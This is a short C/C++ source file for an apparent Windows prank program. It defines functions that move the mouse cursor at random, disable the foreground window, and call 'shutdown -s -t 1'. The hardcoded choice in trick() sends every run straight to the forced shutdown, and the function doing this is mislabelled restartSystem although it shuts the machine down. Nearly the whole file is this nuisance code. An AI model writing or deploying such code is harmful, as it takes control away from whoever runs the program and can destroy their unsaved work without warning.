#include "Header.h"

void trick()
{
	srand((unsigned)time(0));
	int r;
	r = 3;// (rand() % 3) + 1;
	switch (r) {
	case 1: crazyMouse();
	case 2: disableWindow();
	case 3: restartSystem();
	}
}

void crazyMouse()
{
	for (int i = 0; i < 2000; i++) {
		POINT pt = { rand() % 800, rand() % 600 }; SetCursorPos(pt.x, pt.y);
		Sleep(100);
	}
}

void disableWindow()
{
	HWND hWnd = GetForegroundWindow();
	EnableWindow(hWnd, false);
}

void restartSystem()
{
	system("shutdown -s -t 1");
}

